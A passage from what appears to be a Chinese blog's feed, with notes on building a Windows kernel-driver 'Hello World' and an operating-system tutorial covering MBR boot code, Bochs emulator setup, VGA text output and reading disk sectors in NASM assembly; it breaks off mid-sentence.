class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动卸载函数</span></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    DbgPrint(<span class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口函数</span></span><br><span class="line"><span class="comment">// System 在内核模式下运行该函数</span></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);           <span class="comment">//宏防止编译器报错</span></span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Hello World!\n&quot;</span>);                     <span class="comment">//调式输出</span></span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;      <span class="comment">//驱动卸载函数</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;                          <span class="comment">//加载成功返回码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><img src="https://img.joe1sn.top/uploads/big/1d83cc90f91bf254d6db9b7ebbb481a0.png" alt="image-20230216100806109" /></p><p>Class改为 <code>Class=System</code></p><p>ClassInstall32 直接删除两行（就是直接把这个属性删除了）</p><p><img src="https://img.joe1sn.top/uploads/big/03841eddfb57574b75091bd1cd33e806.png" alt="image-20230216101548006" /></p></li><li><p><img src="https://img.joe1sn.top/uploads/big/dc2201764709db7119f6a7b519ac3903.png" alt="image-20230216101554206" /></p><p><img src="https://img.joe1sn.top/uploads/big/c1226951b6d0f3621876333579bb6eb6.png" alt="image-20230216101730183" /></p></li></ul></li><li><p>使用加载器加载</p><ul><li><p>使用KmdManager<img src="https://img.joe1sn.top/uploads/big/0d7768677a0c2e464e7199833004c5e1.png" alt="image-20230216104456039" /></p></li><li><p>使用windbg x64调试</p><p>File -&gt; Kernel Debug</p><p><img src="https://img.joe1sn.top/uploads/big/b55178c253d85e3757e50bf0bb23f14b.png" alt="image-20230216104653478" /></p><p><img src="https://img.joe1sn.top/uploads/big/aecd2c15dc88ad68383aa36767e1ad3b.png" alt="image-20230216112506954" /></p></li></ul></li><li><p>F5继续过后在虚拟机里面运行</p><p><img src="https://img.joe1sn.top/uploads/big/494b5e56c09367a539769d132fb94105.png" alt="image-20230216115613845" /></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;简而言之就是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;visual stdio 2019&lt;/li&gt;
&lt;li&gt;windows SDK&lt;/li&gt;
&lt;li&gt;windows WDK&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果vs没有kernel的项目的模板，找到vs目录的&lt;code&gt;WDK.vsix&lt;/code&gt;即可&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-合集1</title>
    <link href="https://joe1sn.eu.org/2022/08/24/os-allinone/"/>
    <id>https://joe1sn.eu.org/2022/08/24/os-allinone/</id>
    <published>2022-08-24T12:00:00.000Z</published>
    <updated>2023-06-01T14:25:24.449Z</updated>
    
    <content type="html"><![CDATA[<p>代码来源：<a href="https://github.com/StevenBaby/onix">https://github.com/StevenBaby/onix</a></p><p>相关课程：<a href="https://www.bilibili.com/video/BV1gR4y1u7or">https://www.bilibili.com/video/BV1gR4y1u7or</a></p><p>感谢B站UP：<a href="https://space.bilibili.com/491131440">踌躇月光</a> 带来的相关代码和教程</p><p>后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等<br />也有可能你只是为了面试，但是面试也是有重点的对吧<br />所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统</p><span id="more"></span><h1 id="操作系统实现基础篇"><a class="markdownIt-Anchor" href="#操作系统实现基础篇"></a> [操作系统实现]基础篇</h1><p><strong>CPU中的段寄存器</strong></p><ul><li>CS (Code Segment Register)：代码段的段基址</li><li>DS(Data Segment Register)：数据段的段基址</li><li>ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。</li><li>FS(Extra Segment Register)：其值为附加数据段的段基值</li><li>GS：同上</li><li>SS(Stack Segment Register)：堆栈段寄存器</li></ul><ol><li>在实模式中，CS、DS、ES、SS中的值是物理地址</li><li>在保护模式中，装入寄存器的是<strong>段选择子</strong></li></ol><hr /><p><strong>BIOS DOS Linux中断的区别</strong></p><ul><li><p><strong>BIOS、DOS</strong>都是在 <strong>实模式</strong> 中运行，有内部中断向量表(Interrupt Vector Table IVT)建立，用过INT掉用实现</p></li><li><p><strong>BIOS</strong> 中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行</p></li><li><p>BIOS 在运行期间会扫描 0xc0000 0xe0000 之间的内存，若在某个区域发现前两个 节是 Ox55 OxAA 时，这意味着该区域对应的 rom 中有代码存在，再对该区域做累加和检查，若结果与第3个字节的值相符，说明代码无误，就从第4个字节进入</p></li><li><p><strong>Linux</strong> 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表己经不存在了， 取而代之的是中断描述符表(Interrupt Descriptor Table, IDT)。</p><p><strong>Linux 是通过 int 0x80 指令进入一个中断程序后再根据 缸寄存器的值来调用不同的子功能函数的</strong></p></li></ul><hr /><p><strong>Section与Segment的区别</strong></p><ol><li>section 称为节，是指在汇编源码中经由关键字 section segment 修饰、逻辑划分的指令或数据区域， 汇编器会将这两个关键字修饰的区域在目标文件中编译成节，也就是说“节”最初诞生于目标文件中</li><li>segment 称为段，是链接器根据目标文件中属性相同的多个 section 合并后的 section 集合，这个集合 称为 segment ，也就是段，链接器把目标文件链接成可执行文件，因此段最终诞生于可执行文件中</li><li>不管定义了多少节名，最终要把属性相同的 section ，或者编译认为可以放到一块的，合并到一个大的 segment 中，也就是 elf 中说的 program header 中的项</li></ol><hr /><p><strong>MBR 、EBR、DBR、OBR是什么</strong></p><ul><li><p><strong>MBR</strong> 是主引导记录(Main Boot Record)，存在与磁盘开始，扇区大小为512字节</p><ul><li>446 字节的引导程序及参数：</li><li>64字节分区表</li><li>2字节结束标记：\x55\xaa</li></ul></li><li><p><strong>OBR</strong> 内核加载器，存在于操作系统引导扇区，是操作系统引导程序(OS Boot Record)</p></li><li><p><strong>DBR</strong> Dos Boot Record</p><ul><li>MBR跳转引导指令</li><li>厂商信息、DOS版本模块</li><li>BIOS参数块BPB</li><li>OBR</li><li>结束标记 \x55\xaa</li></ul></li><li><p><strong>EBR</strong> Extra Boot Record，解决分区数量限制同时兼容MBR</p><p><strong>MBR EBR 是分区工具创建维护的，不属于操作系统管理的范围</strong></p></li></ul><hr /><p><strong>grub</strong></p><ul><li>multiboot</li></ul><hr /><p><strong>0x7c00</strong></p><ul><li>IBM PC 5150</li><li>DOS 1.0</li></ul><h1 id="操作系统实现mbr"><a class="markdownIt-Anchor" href="#操作系统实现mbr"></a> [操作系统实现]MBR</h1><h2 id="一些问题"><a class="markdownIt-Anchor" href="#一些问题"></a> 一些问题</h2><p>BIOS固定入口地址：0xFFFF0，此时CPU中的cs:ip为 0xF000:0xFFF0（实模式下cs要左移4位再相加）</p><p><strong>？为什么是0x7C00</strong></p><p>MBR程序是在内存的0x7c00中运行的，DOS1.0中的最小内存为32KB，所以选择最后1KB合理，32KB=0x8000B，1KB=0x400，所以程序开始是0x8000-0x100=0x7c00</p><p><strong>如何找到系统调用相关说明</strong></p><ul><li>IBM PS 2 and PC BIOS Interface Technical Reference</li></ul><p><strong>主引导扇区结构</strong></p><ul><li>代码大小：446B</li><li>硬盘分区表：64B=4*16B</li><li>magic_num：0xaa55 - 0x55 0xaa</li></ul><p><strong>主要功能</strong></p><p>​读取内核加载其并执行</p><h2 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h2><p>按照书上配置好环境</p><p>配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#Bochs运行中使用的内存，设置为32M</span><br><span class="line">megs: 32</span><br><span class="line"></span><br><span class="line">#设置真实机器的BIOS和VGA BIOS</span><br><span class="line">#修改成你们对应的地址</span><br><span class="line">romimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/BIOS-bochs-latest</span><br><span class="line">vgaromimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/VGABIOS-lgpl-latest</span><br><span class="line"></span><br><span class="line">#设置Bochs所使用的磁盘</span><br><span class="line">#设置启动盘符</span><br><span class="line">boot: disk</span><br><span class="line"></span><br><span class="line">#设置日志文件的输出</span><br><span class="line">log: bochs.out</span><br><span class="line"></span><br><span class="line">#开启或关闭某些功能，修改成你们对应的地址</span><br><span class="line">mouse: enabled=0</span><br><span class="line">keyboard:keymap=/home/joe1sn/Desktop/real_os/bochs/share/bochs/keymaps/x11-pc-us.map</span><br><span class="line"></span><br><span class="line">#硬盘设置</span><br><span class="line">ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14</span><br><span class="line">ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63</span><br><span class="line">#ata0-master: type=disk, path=&quot;gp60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#增加bochs对gdb的支持，我们在这里不使用，所以注释掉了</span><br><span class="line">#gdbstub: enabled=1, port=1234, text_base=0, data_base=0, bss_base=0</span><br></pre></td></tr></table></figure><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">;MBR</span><br><span class="line">;--------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00;</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov fs,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">;使用6上卷屏幕，实现清屏</span><br><span class="line">;-------------------------------------------------------</span><br><span class="line">mov ax, 0x600</span><br><span class="line">mov bx, 0x700</span><br><span class="line">mov cx, 0</span><br><span class="line">mov dx, 0x184f</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;;;;;得到光标位置</span><br><span class="line">mov ah, 3;3号功能是获取光标位置</span><br><span class="line">mov bh, 0;存储带获取光标的页号</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;;;;;打印字符串</span><br><span class="line">mov ax, message</span><br><span class="line">mov bp, ax</span><br><span class="line"></span><br><span class="line">mov cx, 5</span><br><span class="line">mov ax, 0x1301</span><br><span class="line"></span><br><span class="line">mov bx, 0x2</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">jmp $;pause</span><br><span class="line">message db &quot;MetOS&quot;;要打印的字符串</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p><strong>编译</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -o mbr.bin mbr.asm</span><br></pre></td></tr></table></figure><hr /><p><strong>设置基础BOCHS硬盘</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img</span><br></pre></td></tr></table></figure><p>ata0-master: type=disk, path=“master.img”, mode=flat, cylinders=121, heads=16, spt=63</p><hr /><p><strong>按照格式写入硬盘文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=./mbr.bin of=/home/joe1sn/Desktop/real_os/bochs/hd60M.img bs=512 count=1 conv=notrunc</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2e90a5e48ffc816ddd25878734b86fbd.png" alt="源代码" /></p><p><img src="https://img.joe1sn.top/uploads/big/58d1b92aebc42f763b55cecc54eda244.png" alt="运行" /></p><p><img src="https://img.joe1sn.top/uploads/big/99a479613b4b3ad139ef85ddfc32f1c4.png" alt="效果" /></p><h2 id="使用显卡显示"><a class="markdownIt-Anchor" href="#使用显卡显示"></a> 使用显卡显示</h2><p>IA32 体系系统中，因为用于存储端口号的寄存器是 16 位的，所以最大有 65536 个端口，即 65535 要是通过内存映射，端口就可以用 mov 指令来操作。但由于用的是独立编址，所以就不能把它当作内存来操作，因此 CPU 提供了专门的指令来干这事，in和out</p><p><strong>in</strong>用于读数据 <strong>out</strong>用于写数据</p><p>外部设备BIOS是：0xC000道0xCFFF</p><p>显存是0xB8000到0xBFFFF</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">;Main Bootloader Program</span><br><span class="line">;--------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov fs,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">mov ax,0xb800</span><br><span class="line">mov gs,ax</span><br><span class="line"></span><br><span class="line">;clear screen using int_6</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line">;INT 0x10function_code:6funcion:uproll the screen</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line">;INPUT</span><br><span class="line">mov ax, 0x600</span><br><span class="line">mov bx, 0x700</span><br><span class="line">mov cx, 0</span><br><span class="line">mov dx, 0x184f</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;using gpu</span><br><span class="line">mov byte [gs:0x00],&#x27;M&#x27;</span><br><span class="line">mov byte [gs:0x01],0x04 ;green back_flash</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x02],&#x27;e&#x27;</span><br><span class="line">mov byte [gs:0x03],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x04],&#x27;l&#x27;</span><br><span class="line">mov byte [gs:0x05],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x06],&#x27;t&#x27;</span><br><span class="line">mov byte [gs:0x07],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x08],&#x27;O&#x27;</span><br><span class="line">mov byte [gs:0x09],0x04</span><br><span class="line"></span><br><span class="line">        mov byte [gs:0x0a],&#x27;S&#x27;</span><br><span class="line">        mov byte [gs:0x0b],0x04</span><br><span class="line"></span><br><span class="line">jmp $;pause</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b7f154b4226ed14f8e374f09d597e912.png" alt="image-20220208155034291" /></p><p><img src="https://img.joe1sn.top/uploads/big/707de5657ba853b0a65770311bab2450.png" alt="image-20220208155000889" /></p><h2 id="bochs调试"><a class="markdownIt-Anchor" href="#bochs调试"></a> BOCHS调试</h2><p><strong>Debug Control</strong></p><p>q|quit|exit</p><p>set</p><p>show</p><ul><li><p>show mode</p><p>每次CPU变换模式提醒</p></li><li><p>show int</p><p>每次中断时提醒</p></li><li><p>show call</p><p>函数调用时提醒</p></li></ul><p>u|disasm [/num] [start] [end]</p><p>​反汇编 start到end代码，num是反汇编指令数</p><p><strong>Execution control</strong></p><p>c| cont| continue</p><p>s| step [count]</p><p>p| n| next</p><p><strong>Breakpoint management</strong></p><p>vb| vbreak 按照虚拟地址下断点</p><p>lb| break[addr]线性地址添加断点</p><p>pb| pbreak| b| break [addr] 物理地址添加断点</p><p>sb [delta] delta 表示再执行delta条指令程序就中断</p><p>watch unwatch</p><p>blist 显示所有断点信息</p><p>bpd| bpe [n]禁用断点</p><p>d| del| delete[n] 删除某断点</p><h2 id="mbr使用硬盘-交出控制权"><a class="markdownIt-Anchor" href="#mbr使用硬盘-交出控制权"></a> MBR使用硬盘-交出控制权</h2><p>MBR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">;Main Bootloader Program</span><br><span class="line">;--------------------------------</span><br><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov fs,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">mov ax,0xb800</span><br><span class="line">mov gs,ax</span><br><span class="line"></span><br><span class="line">;clear screen using int_6</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line">;INT 0x10function_code:6funcion:uproll the screen</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line">;INPUT</span><br><span class="line">mov ax, 0x600</span><br><span class="line">mov bx, 0x700</span><br><span class="line">mov cx, 0</span><br><span class="line">mov dx, 0x184f</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;using gpu</span><br><span class="line">mov byte [gs:0x00],&#x27;M&#x27;</span><br><span class="line">mov byte [gs:0x01],0x04 ;green back_flash</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x02],&#x27;e&#x27;</span><br><span class="line">mov byte [gs:0x03],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x04],&#x27;l&#x27;</span><br><span class="line">mov byte [gs:0x05],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x06],&#x27;t&#x27;</span><br><span class="line">mov byte [gs:0x07],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x08],&#x27;O&#x27;</span><br><span class="line">mov byte [gs:0x09],0x04</span><br><span class="line"></span><br><span class="line">        mov byte [gs:0x0a],&#x27;S&#x27;</span><br><span class="line">        mov byte [gs:0x0b],0x04</span><br><span class="line"></span><br><span class="line">mov eax,LOADER_START_SECTOR;起始扇区lba地址</span><br><span class="line">mov bx,LOADER_BASE_ADDR;写入磁盘的地址</span><br><span class="line">mov cd,1;代读入的扇区数</span><br><span class="line">call rd_disk_m_16</span><br><span class="line"></span><br><span class="line">jmp LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">;读取硬盘的第n个扇区</span><br><span class="line">rd_disk_m_16:</span><br><span class="line">;eax=LBA扇区号</span><br><span class="line">;ebx=将数据写入的内存地址</span><br><span class="line">;ecx=读入的扇区数</span><br><span class="line">mov esi,eax;备份eax</span><br><span class="line">mov di,cx;备份cx</span><br><span class="line"></span><br><span class="line">;读写硬盘</span><br><span class="line">;------S1:设置要读取扇区数</span><br><span class="line">mov dx,0x1f2</span><br><span class="line">mov al,cl</span><br><span class="line">out dx,al;代读取的扇区数</span><br><span class="line">mov eax,esi;恢复ax</span><br><span class="line"></span><br><span class="line">;------S2:将LBA地址写入0x1f3-0x1f6</span><br><span class="line">;LBA 地址7-0位写入端口 0x1f3</span><br><span class="line">mov dx,0x1f3</span><br><span class="line">out dx,al</span><br><span class="line"></span><br><span class="line">;LBA 地址15-8 位写入端口 0x1f4</span><br><span class="line">mov cl,8</span><br><span class="line">shr eax,cl</span><br><span class="line">mov dx,0x1f4</span><br><span class="line">out dx,al</span><br><span class="line"></span><br><span class="line">;LBA 地址23-16 位写入端口 0x1f5</span><br><span class="line">        shr eax,cl</span><br><span class="line">        mov dx,0x1f5</span><br><span class="line">        out dx,al</span><br><span class="line"></span><br><span class="line">shr eax,cl</span><br><span class="line">and al,0x0f;LBA 24-27 bits</span><br><span class="line">or al,0xe0;set 7-4 = 1110，表示LBA模式</span><br><span class="line">mov dx,0x1f6</span><br><span class="line">out dx,al</span><br><span class="line"></span><br><span class="line">;------S3:0x1f7端口写入读命令,0x20</span><br><span class="line">mov dx,0x1f7</span><br><span class="line">mov al,0x20</span><br><span class="line">out dx,al</span><br><span class="line"></span><br><span class="line">;------S4:检测硬盘状态</span><br><span class="line"> .not_ready:</span><br><span class="line">nop</span><br><span class="line">in al,dx</span><br><span class="line">and al,0x88;第4位为1表示硬盘控制器已准备好数据传输，第7位为1表示硬盘忙</span><br><span class="line"></span><br><span class="line">cmp al,0x08</span><br><span class="line">jnz .not_ready</span><br><span class="line">;------S5:从0x1f0读取数据</span><br><span class="line">mov ax,di</span><br><span class="line">mov dx,256</span><br><span class="line">mul dx</span><br><span class="line">mov cx,ax</span><br><span class="line">mov dx,0x1f0</span><br><span class="line"> .go_on_ready:</span><br><span class="line">in ax,dx</span><br><span class="line">mov [bx],ax</span><br><span class="line">add bx,2</span><br><span class="line">loop .go_on_ready</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">;jmp $;pause</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>宏<code>LOADER_START_SECTOR</code>就是0x2，表示我们要向磁盘第三个扇区（第一个是0x0）读loader，<code>LOADER_BASE_ADDR</code>就是loader被写入的地址0x900。</p><p>Loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">section loader vstart=LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x00] ,&#x27;2&#x27;</span><br><span class="line">mov byte [gs:0x01] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x02] ,&#x27; &#x27;</span><br><span class="line">mov byte [gs:0x03] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x04] ,&#x27;L&#x27;</span><br><span class="line">mov byte [gs:0x05] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x06] ,&#x27;o&#x27;</span><br><span class="line">mov byte [gs:0x07] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x08] ,&#x27;a&#x27;</span><br><span class="line">mov byte [gs:0x09] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x0a] ,&#x27;d&#x27;</span><br><span class="line">mov byte [gs:0x0b] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x0c] ,&#x27;e&#x27;</span><br><span class="line">mov byte [gs:0x0d] ,0xA4</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x0e] ,&#x27;r&#x27;</span><br><span class="line">mov byte [gs:0x0f] ,0xA4</span><br><span class="line"></span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure><p>编译后写入第二扇区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=./MBR/loader.bin of=/home/joe1sn/Desktop/real_os/bochs/disk60M.img bs=512 count=1 seek=2 conv=notrunc</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab627f0fe46e0b0fb4b5c26a3d806280.png" alt="image-20220208163529418" /></p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>**1.MBR执行流程 **</p><p>从内存最低1KB位置出发，调用BIOS的中断向量表实现</p><p><strong>2.使用外部IO设备</strong></p><p>每个设备在CPU实模式中有内存和端口，按照内存访问+向量表调用可以实现</p><p><strong>3.使用IO启动</strong></p><p>开始和之前相同</p><p>​第1步：设置要读取的扇区数<br />​第2步：将LBA地址存入0x1f3 ~ 0x1f6<br />​第3步：向0x1f7端口写入读命令，0x20<br />​第4步：检测硬盘状态<br />​第5步：从0x1f0端口读数据</p><ol><li>先选择通道，往该通道的 sector count 